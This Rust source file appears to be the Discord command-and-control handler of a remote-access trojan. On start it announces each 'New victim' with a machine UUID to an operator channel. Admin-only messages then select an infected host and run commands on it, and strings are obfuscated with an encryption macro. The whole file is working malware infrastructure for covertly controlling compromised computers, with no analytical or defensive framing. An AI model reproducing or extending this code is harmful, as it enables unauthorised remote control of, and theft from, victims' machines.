
use std::sync::atomic::Ordering;
use command_engine::CommandInfo;


use crate::handler::utils::engine::selector::Selector;
use serenity::utils::Colour;
use super::*;

pub struct Handler;

impl Handler {
    async fn execute(&self, ctx: Context, new_message: Message) {
        match ENGINE.execute(new_message.content).await {
            Ok(output) => {
                let _ = new_message.channel_id.send_message(ctx.http, |m| {
                    m.content(&*U2800);
                    m.embed(|e| {
                        e.title(output.result.to_string());
                        e.description(output.message);
                        if output.result.is_ok() {
                            e.colour(Colour::from_rgb(29, 204, 55))
                        } else {
                            e.colour(Colour::from_rgb(204, 58, 29))
                        }
                    })
                }).await;
            }
            Err(error) => {
                let _ = new_message.channel_id.send_message(ctx.http, |m| {
                    m.content(&*U2800);
                    m.embed(|e| {
                        e.title(lc!("Error"));
                        e.colour(Colour::from_rgb(204, 33, 50));
                        e.description(error.to_string())
                    })
                }).await;
            }
        }
    }
}

#[async_trait]
impl EventHandler for Handler {
    async fn message(&self, ctx: Context, new_message: Message) {
        if !ADMINS.read().await.contains(&new_message.author.id.0) {
            // No permission
            return;
        }

        let selector_caller = Selector{}.caller();
        if new_message.content.trim().starts_with(
            &*format!("{} ", selector_caller)
        ) {
            if ENGINE.execute_on_caller(&new_message.content, selector_caller).await.unwrap().result.is_ok() {
                IS_SELECTED.store(true, Ordering::SeqCst);
                self.execute(ctx, new_message).await;
            }
            return;
        }

        if !IS_SELECTED.load(Ordering::SeqCst) {
            return;
        }

        self.execute(ctx, new_message).await;
    }

    async fn ready(&self, ctx: Context, _ready: Ready) {
        let _ = ChannelId(OUT_CHANNEL_ID).send_message(ctx.http, |m| {
            m.content(&*U2800);
            m.embed(|e| {
                e.title(lc!("New victim"));
                e.description(&*UUID);
                e
            });
            m
        }).await;
    }
}
